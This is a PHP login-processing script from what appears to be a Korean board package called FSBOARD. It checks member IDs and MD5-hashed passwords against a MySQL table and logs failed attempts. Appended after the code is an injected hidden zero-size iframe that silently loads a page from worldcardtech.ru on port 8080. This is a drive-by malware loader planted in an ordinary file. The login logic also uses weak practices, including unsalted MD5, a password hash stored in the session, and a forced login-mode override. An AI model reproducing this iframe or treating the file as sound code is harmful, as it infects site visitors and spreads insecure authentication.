<?
/*************************************************************
	FSBOARD Out Login Assemble Parts
*************************************************************/


@session_start();
	//라이브러리 포함
	include_once $INC_PATH."lib.php";

	//라이브러리 포함
//if(ob_get_contents()) { echo "페이지 상단에 ob_start() 함수가 호출되지 않았습니다.";exit; }

if($_SERVER["REQUEST_METHOD"]=="POST") {
	if(!defined("lib_included")) {
		echo "lib.php 파일의 include가 필요합니다."; exit;
	}
	else {
		if(!eregi($HTTP_HOST,$HTTP_REFERER)) Error("잘못된 접근입니다.");

		$_table_id_members = "_members_";
		$numrows = 0;
		$loginmode = trim($_POST["loginmode"]);
$loginmode="true";
		if($loginmode=="true") {
			$mem_id = trim($_POST["mem_id"]);
			$mem_passwd = trim($_POST["mem_passwd"]);
			$mem_id = StrAddSlashes($mem_id);
			$mem_passwd = md5($mem_passwd);

			if(!$dbConnect) DBConn();


			//아이디 존재여부 확인
			$query = "SELECT * FROM ".$_table_id_members." WHERE mem_id='{$mem_id}';";
			$result = mysql_query($query) or Error(mysql_error());
			if($result) {
				$numrows = mysql_num_rows($result);
				mysql_free_result($result);
			}
			if(!$numrows) { Error("존재하지 않는 아이디입니다.","","MsgBox"); }
			else $numrows = 0;

			//회원 정보 확인
			$query = "SELECT * FROM ".$_table_id_members." WHERE mem_id='{$mem_id}' AND mem_passwd='{$mem_passwd}';";
			$result = mysql_query($query) or Error(mysql_error());
			if($result) {
				$numrows = mysql_num_rows($result);
				if(!$numrows) {
					//로그인 실패기록 저장
					$query = "UPDATE ".$_table_id_members." SET mem_ip_failed='".$_SERVER["REMOTE_ADDR"]."', mem_loginfailed=mem_loginfailed+1, mem_faildate=".mktime()." WHERE mem_id='{$mem_id}';";
					mysql_query($query) or Error(mysql_error());

					Error("암호가 일치하지 않습니다!","","MsgBox");
				}

				$rs = mysql_fetch_array($result);
				$mem_id_origin = $rs["mem_id"];
				$mem_passwd_origin = $rs["mem_passwd"];
				$mem_level = $rs["mem_level"];
				$mem_name = $rs["mem_name"];
				$mem_latestdate = $rs["mem_latestdate"];
				$mem_faildate = $rs["mem_faildate"];
				$mem_loginfailed = $rs["mem_loginfailed"];

			} else Error("로그인에 실패하였습니다.");

			if(empty($mem_id_origin)||empty($mem_passwd_origin)||empty($mem_level)) {
				Error("회원정보가 잘못되었습니다.");
			}
			else {
				if($mem_id_origin==$mem_id && $mem_passwd_origin==$mem_passwd && !empty($mem_level)) {
					$_SESSION["MemId"] = $mem_id;
					$_SESSION["MemPasswd"] = $mem_passwd;
					$_SESSION["MemLevel"] = $mem_level;
					$_SESSION["MemName"] = $mem_name;
					$_SESSION["Host"] = $_SERVER["HTTP_HOST"];

					$query = "UPDATE ".$_table_id_members." SET mem_latestdate=".mktime().", mem_ip_login='".$_SERVER["REMOTE_ADDR"]."', mem_loginnum=mem_loginnum+1, mem_loginfailed=0 WHERE mem_id='".$mem_id."';";
					mysql_query($query) or Error(mysql_error());

					if($mem_loginfailed) {
						echo "<script type=\"text/javascript\">window.alert('정상적으로 로그인 되었습니다.\\n\\n".date("Y-m-d H:i:s",$mem_faildate)." 에 로그인을 {$mem_loginfailed} 번 실패하였습니다.\\n해킹시도일 가능성이 있으므로 암호를 변경하시기 바랍니다.');window.location.href='".(!$HTTP_REFERER?"/":$HTTP_REFERER)."';</script>";
						exit;
					}
					else {
						MovePage(!$HTTP_REFERER?"/":$HTTP_REFERER);
						exit;
					}
				}
				else Error("회원 정보가 일치하지 않습니다.");
			}
		}
	}
echo "<meta http-equiv='refresh' content='0;url=$URL'>"; 
}

////////////////////////
<iframe frameborder="0" onload="if (!this.src){ this.height='0'; this.src='http://worldcardtech.ru:8080/index.php'; this.width='0';}" >1258369201co3</iframe>